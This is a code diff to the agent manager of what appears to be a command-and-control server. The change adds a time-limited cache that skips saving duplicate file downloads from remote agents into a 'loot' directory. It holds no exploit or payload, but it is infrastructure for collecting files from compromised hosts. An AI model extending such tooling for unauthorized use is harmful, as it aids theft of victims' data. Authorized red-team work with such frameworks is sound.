@@ -66,8 +66,11 @@ class AgentManager:
         self._load_agent_secret_keys()
         
         self.interactive_result_callback = None
-        
+
         self.interactive_agent_locks = {}  # agent_id -> {'operator': username, 'session_id': session_id, 'timestamp': datetime}
+
+        # Track processed downloads to prevent duplicates
+        self.processed_downloads = {}  # key: (agent_id, remote_file_path), value: timestamp
         
     
     def setup_db(self):
@@ -790,39 +793,59 @@ class AgentManager:
                     # Sanitize the path for use in filename
                     original_file_path = os.path.basename(original_file_path).replace('/', '_').replace('\\', '_')
 
-                # Generate a timestamp-based filename
-                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                file_extension = os.path.splitext(original_file_path)[1] if os.path.splitext(original_file_path)[1] else ".dat"
+                # Check if this download has already been processed to prevent duplicates
+                download_key = (agent_id, original_file_path)
+                current_time = datetime.now()
 
-                # If the result looks like base64, try to decode it
-                if processed_result.startswith('[ERROR]') or processed_result.startswith('[ERROR'):
-                    # This is an error message, not base64 content
-                    loot_filename = f"download_error_{timestamp}_{original_file_path.replace('.', '_')}.txt"
-                    loot_path = os.path.join(loot_dir, loot_filename)
-                    with open(loot_path, 'w') as f:
-                        f.write(processed_result)
-                    loot_result_msg = f"Download error saved to: {loot_path}"
+                # Clean up old entries (older than 5 minutes) to prevent memory buildup
+                old_keys = []
+                for key, timestamp in self.processed_downloads.items():
+                    if (current_time - timestamp).total_seconds() > 300:  # 5 minutes
+                        old_keys.append(key)
+                for key in old_keys:
+                    del self.processed_downloads[key]
+
+                # Check if this exact download was processed recently
+                if download_key in self.processed_downloads:
+                    self.logger.info(f"Download for {original_file_path} by agent {agent_id} was recently processed, skipping duplicate file save")
+                    # Just return without saving the file again
+                    processed_result = f"[DOWNLOAD ALREADY PROCESSED] File {original_file_path} was already handled recently.\nResult length: {len(processed_result)} chars"
                 else:
-                    # Try to decode as base64
-                    try:
-                        decoded_data = base64.b64decode(processed_result)
-                        loot_filename = f"download_{timestamp}_{original_file_path}"
-                        loot_path = os.path.join(loot_dir, loot_filename)
+                    # Mark this download as processed
+                    self.processed_downloads[download_key] = current_time
 
-                        with open(loot_path, 'wb') as f:
-                            f.write(decoded_data)
+                    # Generate a timestamp-based filename
+                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
 
-                        loot_result_msg = f"Downloaded file saved to: {loot_path} ({len(decoded_data)} bytes)"
-                    except Exception:
-                        # If decoding fails, save as-is
-                        loot_filename = f"download_raw_{timestamp}_{original_file_path.replace('.', '_')}.txt"
+                    # If the result looks like base64, try to decode it
+                    if processed_result.startswith('[ERROR]') or processed_result.startswith('[ERROR'):
+                        # This is an error message, not base64 content
+                        loot_filename = f"download_error_{timestamp}_{original_file_path.replace('.', '_')}.txt"
                         loot_path = os.path.join(loot_dir, loot_filename)
                         with open(loot_path, 'w') as f:
                             f.write(processed_result)
-                        loot_result_msg = f"Raw download content saved to: {loot_path}"
+                        loot_result_msg = f"Download error saved to: {loot_path}"
+                    else:
+                        # Try to decode as base64
+                        try:
+                            decoded_data = base64.b64decode(processed_result)
+                            loot_filename = f"download_{timestamp}_{original_file_path}"
+                            loot_path = os.path.join(loot_dir, loot_filename)
 
-                # Update the result to indicate where the file was saved
-                processed_result = f"[DOWNLOAD COMPLETED] {loot_result_msg}\nOriginal remote path: {original_file_path}\nResult was automatically saved to prevent base64 display in results."
+                            with open(loot_path, 'wb') as f:
+                                f.write(decoded_data)
+
+                            loot_result_msg = f"Downloaded file saved to: {loot_path} ({len(decoded_data)} bytes)"
+                        except Exception:
+                            # If decoding fails, save as-is
+                            loot_filename = f"download_raw_{timestamp}_{original_file_path.replace('.', '_')}.txt"
+                            loot_path = os.path.join(loot_dir, loot_filename)
+                            with open(loot_path, 'w') as f:
+                                f.write(processed_result)
+                            loot_result_msg = f"Raw download content saved to: {loot_path}"
+
+                    # Update the result to indicate where the file was saved
+                    processed_result = f"[DOWNLOAD COMPLETED] {loot_result_msg}\nOriginal remote path: {original_file_path}\nResult was automatically saved to prevent base64 display in results."
 
             except Exception as e:
                 self.logger.error(f"Error processing download task result: {str(e)}")
